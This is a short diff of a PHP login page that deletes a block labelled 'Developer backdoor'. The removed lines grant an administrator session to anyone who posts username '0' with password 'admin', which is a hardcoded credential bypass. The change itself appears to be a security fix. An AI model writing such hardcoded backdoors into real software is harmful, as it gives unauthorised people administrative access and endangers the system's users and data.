@@ -37,21 +37,6 @@
     {
         $_SESSION['login'] = null;
     }
-    
-    //Developer backdoor.
-    if (($_POST['username'] == "0") && ($_POST['password'] == "admin"))
-    {
-        $date = new DateTime();
-        $check = true;
-        
-        $_SESSION['login'] = 0.1;
-        $_SESSION['firstName'] = "TeamTOUCH";
-        $_SESSION['surname'] = "Administrator";
-        $_SESSION['position'] = "";
-        $_SESSION['ward'] = "";
-        $_SESSION['lastLogin'] = $date->format('g:ia')
-            . " on " . $date->format('D jS M Y');
-    }
 ?>
 
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
